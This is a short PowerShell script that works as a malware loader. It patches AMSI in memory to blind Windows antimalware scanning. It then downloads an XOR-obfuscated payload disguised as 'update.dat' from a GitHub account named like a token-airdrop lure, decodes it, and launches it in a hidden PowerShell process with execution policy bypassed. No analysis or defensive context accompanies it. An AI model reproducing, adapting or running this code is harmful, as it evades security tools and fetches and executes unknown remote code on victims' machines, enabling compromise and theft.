try{$t=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$b=[Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static;$f=$t.GetField("amsiContext",$b);$p=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($p,0)}catch{}
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$enc=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/Tokenairdrop527/update/refs/heads/main/update.dat')
$code=[Text.Encoding]::UTF8.GetString(($enc|%{$_-bxor0xAE}))
$b64=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
Start-Process powershell -ArgumentList "-ep bypass -nop -w hidden -enc $b64" -WindowStyle Hidden
exit